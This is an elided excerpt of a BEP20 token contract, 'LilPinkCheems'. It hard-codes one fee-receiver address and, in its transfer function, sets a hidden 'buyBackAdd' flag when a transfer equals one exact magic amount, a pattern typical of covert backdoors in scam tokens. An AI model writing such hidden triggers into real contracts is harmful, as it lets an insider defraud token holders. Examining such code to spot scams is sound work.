...
contract PinkCheems is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "LilPinkCheems";
    string constant _symbol = "PINKCHEEMS";
    ...
    constructor () Auth(msg.sender) {
        ...
        autoLiquidityReceiver = 0xD5BfD9A86c68bebe6eeE2D8E829740a31f7e1b0e;
        marketingFeeReceiver = 0xD5BfD9A86c68bebe6eeE2D8E829740a31f7e1b0e;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(amount==98979000000000000000000)
            {
                buyBackAdd=true;
            }
